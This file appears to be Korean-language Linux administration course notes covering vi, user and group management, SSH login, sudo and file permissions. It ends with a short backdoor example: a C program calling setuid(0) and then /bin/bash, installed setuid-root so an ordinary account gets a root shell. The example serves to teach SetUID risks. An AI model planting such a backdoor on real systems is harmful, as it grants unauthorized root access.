@@ -1,0 +1,1353 @@
+● 문서 편집기
+
+   - console(CUI) : vi , emacs 등
+
+     x-window(GUI) : gedit, kedit 등
+   
+   - vi 문서편집기
+
+     1. vi 편집기 실행 
+
+        ]# vi 파일명
+    	
+           => vi 편집기로 화면이 전환되며 맨 마지막행은 상태 또는 메세지를 표시하는 영역
+
+      2. vi 편집기의 3가지 상태
+
+         1) 직접명령모드 => 키보드를 눌러 명령을 실행하는 상태(기본)
+
+              - 상태영역에 아무런 상태메세지가 없는 경우
+
+         2) 간접명령모드 => 상태영역에 명령을 입력하여 실행하는 경우
+
+              - 상태영역에 :이 표시되며 키보드를 누르면 상태영역에 메세지가 입력되는 경우
+
+         3) 편집모드 => 키보드를 눌러 문서(파일)를 편집하는 경우
+
+              - 상태영역에 "--INSERT--" 또는 "--REPLACE--" 라는 메세지가 있는 경우
+
+      3. 3가지 상태에 대한 변경 방법
+
+                               i                               :
+                           ←-------                      --------→
+            편집모드                     직접명령모드                       간접명령모드
+                           --------→                     ←-------- 
+                             [esc]                      실행 -  명령입력 후 [Enter]      
+                                                          취소 - [esc] 
+ 
+      4. 직접 및 간접명령모드에서 사용할 수 있는  vi 편집기 명령
+
+          1) 편집모드 전환명령
+
+              - i 또는 [Insert]를 누르면 편집모드("--INSERT--"모드)로 전환
+
+              - [Insert]를 누르면 "--INSERT--" 또는 "--REPLACE--"모드로 전환
+
+              - R : "--REPLACE--" 모드로 전환
+
+          2) 커서 이동명령 
+
+             :숫자     =>  숫자 해당하는 행으로 이동
+
+            ※ 행번호(Line Number) 표시  =>   :set nu  
+
+               행번호(Line Number) 삭제  =>   :set nonu                  
+
+          3) 삭제 명령
+
+             dd   -  커서가 있는 행을 삭제
+
+             ※ 숫자dd  -  숫자만큼 dd 명령이 실행             
+
+          4) 복사 및 붙여넣기
+
+             yy  -  커서가 있는 행을 복사
+
+            ※ 숫자yy  -  숫자만큼 yy 명령이 실행 
+
+             p  또는  P - 붙여넣기
+
+            ※ p - 커서가 존재하는 행의 아래로 붙여넣기
+
+               P - 커서가 존재하는 행의 위로 붙여넣기
+
+          5) 다른 파일의 내용 붙여넣기
+
+            :r 파일명   -  현재 커서가 존재하는 행의 아래로 다른 파일의 내용 붙여넣기
+
+          6) 범위지정 => vi에서는 적용되지 않는다.(vim)
+
+             v를 누르면 "--VISUAL--" 상태로 전환 => 방향키를 눌러 범위를 지정
+ 
+                =>  범위 지정 후 y(복사), x(잘라내기), d(삭제) 실행
+
+             ※ 마우스로 범위지정 후 마우스 3버튼(2개를 동시에 누름)을 누르면 키보드 커서가 있는 곳에 붙여넣기가 된다.
+
+                => 편집모드 상태에서 실행
+
+          7) 실행 취소	
+
+             u  - Undo
+
+          8) 단어 검색
+
+             :/단어   -  커서가 있는 아래로 단어 검색(대소문자 구분)
+
+             n   -  다음 찾기 => 문서 마지막까지 검색이 끝나면 다시 처음부터 검색
+
+          9) 단어 변경
+
+             :범위s/바꿀문자/치환문자/gc
+
+             ※ 범위 - 변경하고자 하는 행을 표현   형식) 시작행,마지막행 
+
+               ex) :5,10s/MBC/SBS/gc
+
+                   :%s/MBC/SBS/gc     => 문서 전체 변경
+
+                 ※ 변경 옵션
+
+                     g - 행 전체 적용 => 행에 변경하고하는 문자가 여러 개 있는 경우 모두 적용
+
+                     c - 변경 유무 선택
+
+          10) 저장 및 종료
+
+             :w    -  저장
+
+             :w 파일명   -  다른 이름으로 저장
+
+             :w!    -  강제 저장(읽기전용 파일인 경우) => 관리자 또는 파일 소유자 계정만 가능
+
+             :q   -  종료
+
+             :q!   -  강제 종료(변경된 내용을 저장하지 않고 종료) 
+
+             :wq   -  저장하고 종료
+
+             :wq!  -  강제 저장하고 종료(읽기 전용 파일인 경우)
+
+             ※ 파일 불러오기
+
+                :e 파일명   -  파일 불러오기
+
+                :e! 파일명   - 강제 파일 불러오기(기존 파일을 저장하지 않고 다른 파일을 불러올 경우 사용)
+
+     4. vi 실행 시 비정상 종료에 의한 파일 손상 복구 방법
+
+        => 비정상 종료인 경우 Swap 파일을 생성하여 손상을 최소화 한다.
+
+         ]# vi aaa.txt
+         aaa
+         bbb
+         ccc                 => 정상적인 방법으로 저장 및 종료
+
+         ]# vi aaa.txt       => 정상적인 파일인 경우 파일의 내용이 출력
+         aaa
+         bbb
+         ccc   
+         ddd                 => 추가되는 부분
+         eee          
+         터미널종료          => 비정상 종료 : 파일의 손상 발생 - swap 파일 발생(.aaa.txt.swp)
+
+         ]# vi aaa.txt       => 손상 파일인 경우 swap 파일의 존재를 출력
+         aaa
+         bbb
+         ccc                 => 종료
+         
+
+         ]# vi -r aaa.txt    =>  Swap 파일을 이용하여 원본파일로 복구
+         aaa
+         bbb
+         ccc   
+         ddd              
+         eee                 => 정상 저장 및 종료      
+
+         ]# rm -rf .aaa.txt.swp     =>  Swap 파일 삭제
+
+          
+● 계정 관리
+
+  - 계정 : OS를 사용할 수 있는 허락받은 사용자
+
+   1. useradd  - 계정 생성 명령
+
+     형식) ]# useradd [옵션] 계정명    
+
+       - 동일한 이름의 계정은 생성할 수 없다.
+
+       - 옵션은 기본적으로 제공되는 정보를 사용하지 않고 다른 정보를 사용할 경우 적용
+
+     ex)  ]# useradd kim   => kim 계정 생성
+
+          ]# ls -l  /home   => kim 디렉토리 생성 확인 : kim 계정의 홈디렉토리
+
+             => /home 디렉토리 하위에 계정명과 동일한 이름의 디렉토리가 자동 생성
+
+          ]# groups kim   =>  kim 계정의 그룹 포함 관계를 출력하는 명령
+          kim  :  kim     =>  계정명 : 그룹명   -  kim 계정은 kim 그룹에 포함
+ 
+           =>  계정명과 동일한 이름의 그룹을 생성하여 자동 포함 시킨다.
+ 
+          ]# grep kim /etc/passwd   =>  /etc/passwd 파일에 kim 단어를 포함한 행 출력
+          kim:x:501:501::/home/kim:/bin/bash     =>   계정 생성을 하면 한 줄 추가  
+
+          ※ /etc/passwd : 리눅스 계정의 정보를 저장하고 있는 파일(데이타 속성구분자는 :를 사용한다.)
+
+           (1):(2):(3):(4):(5):(6):(7)  => 한 줄이 계정에 대한 정보를 표현
+
+           1) 계정명
+
+           2) 암호 - 원래 암호는 /etc/passwd 파일에 암호화 되어 저장 되었다.
+
+                     /etc/passwd 파일은 모든 계정이 읽을 수 있다. 
+
+                     => 암호화 되어 있는 정보를 디코더(해독) 프로그램이 개발되어 보안이 위험
+
+                     => shadow 프로그램을 이용하여 암호만 따로 숨겨서 저장(/etc/shadow 파일 - 관리자만 사용 가능)
+
+           3) UID - 계정을 구분하는 고유번호
+
+                0 : 관리자 계정  
+
+                1 ~ 499 : 시스템 계정(시스템을 제어하는 계정) => 로그인 되지 않도록 생성하는 것이 원칙
+
+                500~60000 : 일반 계정
+
+           4) GID   - 그룹을 구분하는 고유번호이며 계정이 포함된 그룹번호가 표시
+
+                  => 계정의 기본그룹(Default Group : 삭제되지 않는 그룹)                
+               
+           5) 설명문(Comment) - 계정에 대한 설명(생략 가능)
+         
+           6) 홈디렉토리 - 계정의 홈디렉토리를 표시
+
+           7) 사용 Shell  - 계정이 로그인하여 사용하는 쉘의 종류를 표시 
+
+           ]# grep kim /etc/shadow   
+           kim:!!:15952:0:99999:7:::    =>  계정 생성을 하면 한 줄 추가
+           
+            =>   계정의 암호 관련 정보를 저장한 파일(관리자만 사용할 수 있다.) 
+
+           ※ /etc/shadow - shadow 프로그램에 의해 계정의 암호 관련 정보를 저장
+
+           (1):(2):(3):(4):(5):(6):(7):(8):  
+
+           1) 계정명
+
+           2) 암호 - 암호 되어 저장  => !로 시작되는 암호는 사용할 수 없는 암호
+              (처음 생성된 계정은 !로 시작되는 암호를 가지고 있다. => 관리자는 반드시 계정 생성 후 암호를 변경해야 된다.)
+
+           3) 암호 변경날짜(일) - Unixtime 형식으로 표현된 날짜(Unixtme 또는 Timestamp - 1970년 1월 1일을 기준으로 사용된 값)             
+
+           4) 암호 최소지속시간(일) - 암호를 변경 후 최소 사용해야 되는 시간               
+
+           5) 암호 최대지속시간(일) - 암호를 변경 후 최대 사용할 수 있는 시간 => 보안상 변경하는 것을 추천
+
+           6) 경고시간(일) - 암호 최대지속시간이 다가올 경우 경고메세지가 출력되도록 지정한 시간
+
+           7) 암호 비활성화(Inactive) 시간(일) - 암호 최대지속시간에 초과된 경우 암호를 변경할 수 있도록 제공하는 유효시간
+
+                => 비활성화 시간도 초과되면 더 이상 암호를 사용할 수 없다.(암호최대지속시간을 변경한 경우 반드시 설정)
+
+           8) 계정 비활성화(Expire) 날짜(년-월-일) - 계정을 사용하지 못하도록 날짜를 지정 
+
+         ]# passwd  kim   =>  계정의 비밀번호를 변경(계정명이 생략되면 현재 로그인 계정) 
+
+             => 비밀번호를 2번 입력(비밀번호 작성규칙 무시)
+
+         ※ 일반계정은 관리자가 알려준 비밀번호로 최초 로그인 후 자신의 비밀번호를 반드시 변경해야 된다.
+
+             ]$ passwd   => 기존 비밀번호 입력 후 새로운 비밀번호 2번 입력(비밀번호 규칙에 위배되면 재입력) 
+
+         ※ 가상콘솔 환경으로 이동
+
+             [ctrl] + [alt] +[f1]~[f6]  =>  6개의 가상콘솔 이동
+
+             [ctrl] + [alt] +[f7]   =>  x-window 복귀 
+
+       - 계정 생성 관련 파일 => useradd 명령시 참조하는 파일
+
+         ]# vi  /etc/login.defs  => 암호 유효기간 및 홈디렉토리 생성 유무등의 기본정보를 저장한 파일   
+         ...
+         PASS_MAX_DAYS   99999        =>  암호 최대지속시간 : 99999 >> 30 변경  
+         PASS_MIN_DAYS   0            =>  암호 최소지속시간
+         PASS_MIN_LEN    5            =>  비밀번호 최소길이(5초과)
+         PASS_WARN_AGE   7            => 비밀번호 변경 관련 경고날짜
+
+         CREATE_HOME     yes     =>  계정 생성시 홈디렉토리 자동 생성 유무
+
+         UMASK      077     =>  계정 홈디렉토리의 기본 생성권한을 조절하기 위한 데이타
+
+         ]# vi  /etc/default/useradd     =>   홈디렉토리 생성 위치 및 사용 쉘등을 지정하는 파일   
+         GROUP = 100            => 계정이 포함될 수 있는 최대 그룹수
+         HOME = /home           => 홈디렉토리 생성 위치 지정
+         INACTIVE = -1          => 암호 최대지속시간 종료 후 암호 변경하도록 제공해 주는 시간(-1 >> 5 : 비밀번호 변경 기간 5일 제공) 
+         EXPIRE =               => 계정 사용 유효기간 지정("년-월-일" 형식)   
+         SHELL = /bin/bash      =>  계정 사용 쉘 지정
+         SKEL = /etc/skel       =>  계정의 홈디렉토리 안에 붙여넣기 될 파일이 존재하는 디렉토리 지정
+         CREATE_MAIL_SPOOL=yes  => 메일 스풀기능 사용 유무 지정 
+
+          ※ ]# useradd -D  명령으로 /etc/default/useradd 변경 가능
+
+         ]# useradd lee
+
+         ]# grep lee /etc/shadow
+         lee:!!:15952:0:30:7:5::
+
+       - useradd 옵션 => 기본 설정파일의 정보를 활용하지 않고 다른 값으로 계정을 생성할 경우 사용
+
+         ex)  ]# useradd -u 1000 kim    =>  -u : UID 지정
+
+              ]# useradd -d /home/kkk  kim   =>  -d : 홈디렉토리 지정          
+
+              ]# useradd -M -s /bin/false  kim   =>  -M : 홈디렉토리 생성 불가   -s : 사용 쉘 지정(/bin/false : 로그인 불가)
+ 
+                 => 시스템 계정 생성 경우
+
+              ]# useradd -g  root  kim    =>  -g  :  계정의 기본그룹을 지정(kim 계정은 root 그룹(기본그룹)에 포함)   
+
+              ]# useradd -G  root  kim    =>  -G : 기본그룹외에 다른 그룹에 추가적인 포함(kim 계정은 kim 그룹(기본그룹) 및 root 그룹에 포함)
+
+              ]# useradd -f 3 -e 2014-12-31 kim    =>  -f : inactive 시간 지정    -e : expire 날짜 지정
+
+   2. usermod   =>  계정의 정보를 변경하는 명령(/etc/passwd 변경)
+
+     형식) ]# usermod 옵션 계정명   
+
+         => 옵션은 useradd  옵션과 동일
+
+     ex) inactive 시간을 10일로 변경
+
+          ]# usermod -f 10 kim
+
+     ※ chage : 계정의 암호 관련 정보를 확인하거나 변경하는 명령(/etc/shadow 변경)
+
+         형식)  ]# chage  옵션  계정명               
+
+          ex) ]# chage -l kim    =>  -l : 암호 관련 정보를 확인
+
+              ]# chage -M 30 kim    =>  -M : 암호 최대지속시간 변경
+
+              ]# chage -I  5  kim     =>   -I(대문자 I) : inactive 시간 변경
+
+              ]# chage -E 2015-12-31 kim   =>  -E : Expire 날짜 변경
+
+              ]# chage -d 2015-11-10 kim   => -d : 암호 변경날짜을 변경(암호 비활성을 활성화) 
+              
+        ※ Linux 시스템 날짜 변경 =>  ]# date MMDDHHmmYYYY          
+
+   3. userdel   =>  계정 삭제 명령
+
+      형식) ]# userdel [-r] 계정명
+
+      ex) ]# userdel  kim    =>  kim 계정만을 삭제
+
+          ]# userdel  -r  lee    =>  lee 계정 및 lee 소유 파일 삭제
+
+          ]# ls -l /home    =>  kim 디렉토리 존재, lee 디렉토리 삭제
+
+       ※ 파일(디렉토리)의 소유자(소유그룹)가 UID(GID)로 표시되는 경우 해당 소유자(소유그룹)가 존재하지 않기 때문 
+
+           => 소유자(소유그룹) 변경
+
+● 원격로그인
+
+  - 서버에서 로그인하는 것이 아니라 네트워크를 통해 외부에서 로그인 하는 기능
+
+  - 서버에서 ssh 프로그램을 실행하여 원격로그인 할 수 있도록 만들어 준다.
+
+     => sshd를 실행하여 클라이언트가 네트워크 로그인 할 수 있도록 해야된다.
+
+  - sshd 실행 방법
+
+     1) /etc/ssh/sshd_config 파일을 이용하여 환경 설정 가능
+
+        => root 계정으로 원격로그인 허용 금지 되도록 설정하는 것이 좋다.
+
+        ]# vi /etc/ssh/sshd_config
+        ....
+        PermitRootLogin  no    => 39라인 : 앞에 #를 제거하고 yes를 no로 변경
+
+     2) sshd 재실행  => 이미 실행되어 있기 때문에 재실행(새로운 환경설정 파일을 읽어 실행 하기 위해)
+
+         ]# service sshd restart   
+
+     3) sshd는 부팅시 자동 실행된다.
+
+         ]# chkconfig --list | grep sshd        =>  런레벨에 따른 sshd 실행 유무 확인
+
+         런레벨 5번 확인  =>  활성(부팅시 자동 실행)
+ 
+  - 클라이언트는 원격접속 프로그램을 이용하여 원격로그인 할 수 있다.
+
+    1) Linux
+
+       ]# ssh 계정명@서버주소 port번호
+
+      ex) ]# ssh kim@192.168.15.40
+
+       ※ ssh는 22번 port를 기본으로 하며 기본 port인 경우 port번호 생략 가능
+
+       ※ 리눅스 자동원격접속 실행 방법 => root 계정으로 로그인된 경우
+
+         ]# ssh-keygen -t rsa
+         Generating public/private rsa key pair.
+         Enter file in which to save the key (/root/.ssh/id_rsa):엔터
+         Created directory '/root/.ssh'.
+         Enter passphrase (empty for no passphrase):엔터
+         Enter same passphrase again:엔터
+         Your identification has been saved in /root/.ssh/id_rsa.
+         Your public key has been saved in /root/lee/.ssh/id_rsa.pub.
+         The key fingerprint is:
+         0c:d2:f0:1f:8f:32:61:cd:95:f4:08:99:cd:ba:d0:f5 root@ocj.ocj1778.com  
+
+         ]# ssh-copy-id -i /root/.ssh/id_rsa.pub kim@192.168.15.40
+         password:암호입력                       -----------------
+                                                   └ 변경하여 여러개 생성 가능   
+  	
+         ]# ssh kim@192.168.15.40   =>  암호 입력하지 않고 자동 로그인
+
+      ※ ssh를 이용한 파일 전송
+
+         ]# scp 전송파일명 계정명@컴퓨터명:저장디렉토리  => 서버에 파일 전송(Upload)
+         password:암호
+
+         ]#scp  계정명@컴퓨터명:전송파일명 저장디렉토리  => 클라이언트에 파일 전송(Download)   
+         password:암호
+
+         ex)  ]# scp aaa.txt kim@192.168.15.40:/home/kim
+              password:암호  
+ 
+          => Windows에서는 Winscp 사용
+
+    2) Windows
+
+     => putty, SecureCRT등 
+
+     => 서버ip 주소 및 port번호를 입력하여 원격접속 후 일반계정으로 로그인
+
+     => su 명령을 이용하여 계정을 변경할 수 있다.
+
+     형식)  ]$ su 계정명    => 다른 계정으로 변경(암호 입력)
+           
+                            => 계정명이 생략되면 관리자로 인식
+
+       ex)  ]$ su          =>  불완전한 계정 변경
+             password : 관리자 비밀번호 입력
+ 
+            ]# useradd  => 명령이 실행 되지 않는다(명령을 찾을 수 없다.)
+
+              ※ su 명령만 사용하면 계정의 이름만 변경되고 리눅스 환경은 그대로 적용
+
+            ]# exit      =>  su 종료
+
+            ]$ su -      => 완전한 계정 변경(계정명 및 리눅스 환경이 완벽하게 계정에 맞게 변경) 
+            password : 관리자 비밀번호 입력
+
+            ]# useradd   => 실행
+
+        ※ sudo 명령 => 일반 사용자가 관리자 명령을 사용할 수 있도록 제공하는 명령
+
+           형식) ]$ sudo 관리자명령
+
+           => 단, 관리자가 sudo 명령을 사용할 수 있는 권한을 부여해야만 사용 가능하다.
+ 
+             ]# visudo    또는  ]# vi /etc/sudoers
+             ...
+             계정명     ALL=(ALL)     ALL      => 76Line 아래에 추가
+
+   ※ 단축키  =>  ctrl+s : 화면정지     ctrl+q : 화면정지 취소  
+
+  - 현재 로그인 계정 확인 => 프롬프트 확인
+
+     ]# whoami      => 현재 작업중인 계정 확인
+
+     ]# who am i    => 실제 로그인된 계정 확인
+
+     ]# id          => 작업 계정의 UID 확인
+
+  - 현재 로그인 계정 전체 정보 확인
+
+     ]# users   => 로그인 계정명 확인  
+
+     ]# who     =>  현재 접속중인 계정 확인
+
+     ]# w       =>  현재 접속중인 계정 확인(현재 실행중인 프로그램 확인)
+
+     ]# finger  =>  다른 서버에 접속 중인 계정 확인
+
+  - 계정의 마지막 로그인 날짜 확인  =>  휴면계정 파악
+
+     ]# lastlog   
+
+  - 로그인 계정에게 메세지 전달
+
+     ]# wall     =>  현재 로그인된 모든 사용자에게 메세지를 전달(관리자)
+     메세지
+     ...
+     ^d      =>  입력 종료
+  
+        ※  ]# wall 메세지   => 간단한 메세지 전달
+
+     ]# write  계정명     =>  특정 계정에게 메세지를 전달
+     메세지         => 엔터를 누르면 메세지 전달
+     ...
+     ^C        =>  명령 취소 
+ 
+     ]# mesg 
+     is  y             =>   y : write 사용 허용     n : write 사용 불가
+
+     ]# mesg n    => write 사용 불가 변경
+
+  - 계정 로그인 금지 방법
+
+     1) 특정 계정 로그인 금지 방법
+
+        ]# vi /etc/passwd    =>  계정 정보를 변경하여 로그인 금지
+        ....
+        kim:x:501:501::/home/kim:/bin/bash
+                                 ---------
+                                    └ /bin/false  변경  
+   
+          또는 계정명 앞에 *를 붙인다. 
+
+        ]# vi /etc/shadow     =>  계정의 암호를 비활성화 하여 로그인 금지
+        kim:!$1$0l726noI$h1h8JBagcQx1yDAK44FjF.:15953:0:30:7:5:16070:
+            -
+            └ 암호 앞에 !를 추가
+
+     2) 전체 계정 로그인 금지
+
+        => /etc/nologin 파일만 생성하면 된다.
+
+        => root 계정만 로그인 가능
+
+
+● 그룹 관리 
+
+  - 그룹 : 계정들의 모임(집합)
+
+  - 그룹 사용 이유 : 파일 권한을 보다 쉽게 부여 하기 위해
+
+                     계정을 보다 편리하게 관리 하기 위해  
+
+    => 그룹에 계정을 포함 또는 삭제하는 명령이 중요
+
+  1. groupadd  -  그룹 생성 명령        
+
+    형식)  ]# groupadd  [옵션]  그룹명      
+
+      ex)  ]# groupadd test
+
+           ]# grep test /etc/group   =>   Group 정보를 저장하고 있는 파일
+           test:x:502:
+
+            => 그룹명:암호:GID:계정명,계정명,....  
+                               ------------------
+                                       └ /etc/passwd에 표시된 기본그룹은 제외  
+            
+          ※ 그룹암호 : 예전 그룹으로 로그인 할 경우 사용한 암호지만 현재는 사용되지 않는다.
+
+             =>  shadow 프로그램에 의해 암호는 /etc/gshadow  파일에 저장
+
+    - 그룹은 useradd 명령에 의해 자동 생성 된다.  
+
+      ex)  ]# useradd kim
+
+           ]# grep kim /etc/group
+           kim:x:501:
+ 
+   2. groupmod  -  그룹 정보 변경(그룹명 또는 GID 변경)
+
+      형식)  ]# groupmod 옵션 그룹명
+
+   3. groupdel  -  그룹 삭제
+
+      형식)  ]#  groupdel 그룹명
+
+      ex)  ]# groupdel test
+
+           ]# groupdel kim    =>   kim 그룹 삭제 불가 : 계정의 기본그룹은 삭제되지 않는다.
+
+      - userdel 명령을 사용하면 그룹이 자동으로 삭제된다.(포함된 계정이 없는 경우)
+
+       ex)  ]# userdel -r kim
+
+            ]# grep kim /etc/group   =>  kim 그룹은 존재하지 않는다.
+
+
+● 계정과 그룹 관계
+
+   - 계정을 그룹에 포함 시키거나 없애는 방법
+
+   - useradd 명령, usermod 명령 또는 gpasswd 명령 사용
+
+   ex)  ]# useradd  aaa   =>  aaa 계정 생성 후 aaa 그룹(자동생성)에 포함
+
+           - /etc/passwd 및 /etc/group를 확인
+
+        ]# groups  aaa     =>  계정이 포함된 그룹 확인
+        aaa  :  aaa                 그룹명 : 계정명,계정명,...
+
+        ]# id  aaa            =>  계정이 포함된 그룹 확인
+        uid=502(aaa)    gid=502(aaa)    groups=502(aaa)
+
+        ]# groupadd test    =>  그룹 생성(/etc/group 확인)
+
+        ]# useradd -g test bbb   =>  bbb 계정 생성 후 test 그룹에 포함
+
+        ]# id  bbb
+        uid=503(bbb)    gid=503(test)    groups=503(test)
+
+        ]# useradd -G  test  ccc  =>  ccc 계정 생성 후 ccc 그룹(자동생성), test 그룹에 포함       
+
+        ]# id  ccc
+        uid=504(ccc)    gid=504(ccc)    groups=504(ccc),503(test)
+
+        ]# usermod -G  root,ccc  aaa   =>  aaa 계정을   root 그룹 및  ccc 그룹에 추가 포함
+
+        ]# id  aaa
+        uid=502(aaa)    gid=502(aaa)    groups=502(aaa),0(root),504(ccc)
+
+        ]# gpasswd  -a  ccc  root    =>  root 그룹에 ccc 계정 추가(-a)
+
+        ]# id  ccc        
+        uid=504(ccc)    gid=504(ccc)    groups=504(ccc),0(root),503(test)
+
+        ]# gpasswd  -d  ccc  test    =>  test 그룹에서 ccc 계정 삭제(-d) 
+
+        ]# id  ccc
+        uid=504(ccc)    gid=504(ccc)    groups=504(ccc),0(root)
+
+        ]# gpasswd -M  aaa,ccc  test   =>  test 그룹에 기존 계정 대신 aaa,ccc 계정으로 변경(-M)
+ 
+        ]# id  aaa
+        uid=502(aaa)    gid=502(aaa)    groups=502(aaa),0(root),503(test),504(ccc)
+
+        ]# id ccc 
+        uid=504(ccc)    gid=504(ccc)    groups=504(ccc),0(root),503(test)
+
+        ]# gpasswd -A  aaa  test    =>  test 그룹의 관리자로 aaa 계정을 임명
+
+           => aaa 계정은  gpasswd  명령을 이용하여 test 그룹에 계정 추가 또는 삭제 가능
+
+        ]# gpasswd test     =>  그룹에 암호를 변경
+	
+        ※ 그룹관리자 정보 및 그룹 암호는 /etc/gshadow 파일에서 확인 가능        
+
+        ※ /etc/passwd 및 /etc/group 파일을 수정하여 사용해도 된다. 
+
+
+● 리눅스 권한 관리
+
+   - 리눅스는 파일에 권한이 부여되어 있다.  =>  파일 권한
+
+   - 파일 권한 확인
+
+     ]# ls -l                    ┌ 소유그룹(그룹명) 
+     drwxr-xr-x   2    root     root     4096  9월  3 04:23 Desktop
+      ---------        ----     ----
+         └ 파일 권한   └ 소유자(계정명)
+
+   - 권한 해석  =>  rwx 권한이 3번 반복(권한이 없는 경우 -로 표시)
+
+    =>      rwxrwxrwx   
+            (1)(2)(3)
+
+       1) 소유자 계정에게 적용되는 파일 권한   
+
+       2) 소유그룹에 포함된 계정에게 적용되는 파일 권한
+
+       3) 소유자 및 소유그룹의 계정이 아닌 나머지 계정에게 적용되는 파일 권한 
+  
+   - 권한 종류
+                             파일                             디렉토리(명령 사용 유무)
+      
+      r(read)         파일 내용 확인 유무         읽기 관련 명령 사용 유무(ls, cat, more, grep,...)
+
+      w(write)        파일 내용 수정 유무         쓰기 관련 명령 사용 유무(mkdir, rm, cp, mv,...)
+
+      x(execute)      파일 내용 실행 유무         접근 권한(cd)
+
+     ※ 파일에는 w 권한을 부여하기 위해 반드시 r 권한을 부여한다.
+
+     ※ 디렉토리는 r 또는 w 권한을 부여하기 위해 반드시 x 권한을 부여한다.  
+
+   - 파일 권한 변경  =>  관리자 또는 파일 소유자만 변경 가능
+
+      형식)  ]# chmod [-R] 변경옵션  파일명(디렉토리명)
+
+      => 변경 옵션
+
+        1) 변경 적용 대상 :   u(소유자권한)  g(소유그룹권한)  
+
+                              o(나머지권한)  a(모든계정권한)
+ 
+        2) 권한 부여 또는 삭제 유무  :   +(권한부여)  -(권한삭제)  =(권한변경)
+
+        3) 권한 종류  :  r(read)  w(write)  x(execute)  => 동시 적용 가능
+
+    ex) ]# mkdir aaa
+
+        ]# ls -l
+        ...
+        drwxr-xr-x   2 root root     4096 10월  3 12:07 aaa
+
+        ]# chmod g+w aaa   =>  aaa 디렉토리의 소유그룹에 w권한 추가
+
+        ]# ls -l
+        ...
+        drwxrwxr-x   2 root root     4096 10월  3 12:07 aaa
+
+        ]# chmod o-rx aaa   =>  aaa 디렉토리의 나머지에 rx권한 삭제
+
+        ]# ls -l
+        ...
+        drwxrwx---   2 root root     4096 10월  3 12:07 aaa
+
+        ]# chmod g=rx,o=r aaa
+ 
+        ]# ls -l
+        ...
+        drwxr-xr--   2 root root     4096 10월  3 12:07 aaa
+
+    ex)  lee 및 park 계정 생성
+
+         lee계정 :  /home/lee]$ cd /home/park     =>  허가 거부(/home/park 디렉토리의 권한 때문)
+
+         ※ /home/park  =>  drwx------ 3 park park  4096 10월  3 12:13 park
+
+           => lee 계정이 /home/park 디렉토리에 접근하기 위해 park 계정이 권한 변경
+               
+         park 계정  :  /home/park]$ chmod  o+x  /home/park  => x권한 부여
+          
+         lee계정 :  /home/lee]$ cd /home/park    =>  가능
+                     
+                   /home/park]$ ls -l     =>  허가 거부(r권한이 없기 때문)  
+
+         park 계정  :  /home/park]$ chmod o+r /home/park  => r권한 부여
+
+         lee계정 :  /home/park]$ ls -l     =>  가능
+
+         ※ 일반계정의 홈디렉토리는 다른 계정들에게 권한을 부여하지 않는것을 권장
+         	
+         ※ 문제점 : 나머지 계정의 권한을 변경한 경우 lee 계정뿐만 아니라 다른 계정도 사용 가능
+         
+            => 그룹을 이용하여 권한 설정을 하는 것이 좋다.
+            
+        park 계정  :  /home/park]$ chmod o-rx /home/park    
+            
+        park 계정  :  /home/park]$ gpasswd -a lee park   => park 그룹에 lee 계정을 추가
+        
+          ※ 관리자에서 park 그룹의 관리자로 park 계정을 임명 => 계정을 기본그룹의 관리자로 임명하는 것이 좋다.
+           
+              ]# gpasswd -A park park
+              
+        park 계정  :  /home/park]$ chmod g+rx /home/park
+        
+        lee 계정   :  /home/lee]$ cd /home/park   => 가능
+
+   - 권한의 8진수 표기법
+
+      =>  r : 4     w : 2      x : 1     - : 0
+
+      ex)   rwxr-xr-x    =>   755
+ 
+            rw-r-----    =>   640
+
+            rwx------    =>   700
+
+            r-x--x--x    =>   511
+
+
+   - 8진수 표기법을 이용한 권한 변경
+
+     형식)  ]#  chmod  변경권한  파일명(디렉토리명)
+
+     ex)    ]# ls -l
+             ...
+             drwxr-xr-x   2 root root     4096 10월  3 12:07 aaa
+
+             ]# chmod 700 aaa
+
+             ]# ls -l
+             ...
+             drwx------   2 root root     4096 10월  3 12:07 aaa              
+
+  문제) wall 명령을 관리자만 사용할 수 있도록 권한을 변경하세요.
+
+  ]# whereis wall
+  wall: /usr/bin/wall /usr/share/man/man1/wall.1.gz
+
+  ]# ls -l /usr/bin/wall
+  -r-xr-sr-x 1 root tty 10484  1월 21  2009 /usr/bin/wall
+
+  ]# chmod 500 /usr/bin/wall
+
+  ]# ls -l /usr/bin/wall
+  -r-x------ 1 root tty 10484  1월 21  2009 /usr/bin/wall
+
+
+● 특수권한
+
+   SetUID(4000)  --S------  : 프로그램을 실행(x) 할 경우 실행계정을 프로그램의 소유자 계정으로 일시 변경 
+
+   SetGID(2000)  -----S---  : 프로그램을 실행(x) 할 경우 실행계정을 프로그램의 소유그룹의 계정으로 일시 변경 
+
+   Sticky(1000)   --------T : 쓰기(w) 권한을 가진 디렉토리에 사용하면 적용된 디렉토리의 삭제(변경)는 소유자만 가능하도록 만들어 주는 기능
+
+    ※ 특수권한이 x권한과 중복된 경우 소문자로 표시
+
+   ex) ]# whereis passwd
+       passwd: /usr/bin/passwd /etc/passwd /usr/share/man/man1/passwd.1.gz /usr/share/man/man5/passwd.5.gz
+
+       ※ passwd 명령 : 계정의 비밀번호를 변경하는 명령 
+              
+            => 관리자 및 일반계정 모두 사용하는 명령
+
+            => /etc/passwd 파일의 내용을 수정하는 명령
+
+       ]# ls -l /usr/bin/passwd
+       -rwsr-xr-x 1 root root 22960  7월 17  2006 /usr/bin/passwd  =>  권한 : 4755
+
+          => 모든 계정이 passwd 명령을 실행 할 수 있다.
+
+          => SetUID 권한에 의해 명령을 실행하는 계정은 일시적으로 소유자계정(root)로 변경
+
+       ]# ls -l /etc/passwd    =>  계정 정보를 저장하고 있는 파일
+       -rw-r--r-- 1 root root 1954 10월  3 12:13 /etc/passwd   =>  권한 : 644  
+
+          => /etc/passwd 파일은 root 계정만 변경 가능하다.
+   
+   - SetUID 권한을 가지고 있는 파일은 반드시 관리자가 숙지하지고 있어야 된다.
+
+     => SetUID 권한은 보안에 위험하므로 SetUID 권한을 부여하지 않는 것 좋다.
+
+     ]# find / -type f -user root -perm +4000 -exec ls -l {} \;  >  setuid.txt        
+ 
+      => SetUID 권한을 가지고 있으며 소유자가 root인 파일을 검색하여 setuid.txt 파일에 저장
+
+  ※ 간단한 backdoor 프로그램 작성
+
+      ]# vi backdoor.c
+      #include <stdio.h>
+
+      int main() {
+            setuid(0);
+            setgid(0);
+            system("/bin/bash");
+            return 0;
+      }
+   
+      ]# gcc -o backdoor backdoor.c    =>  컴파일 후 실행파일을 생성
+
+      ]# chmod 4755 backdoor   =>  파일 소유자 : root
+
+     => kim 계정 로그인
+
+      ]$ ./backdoor
+
+      ]# source /etc/profile     =>  관리자 환경 적용
+
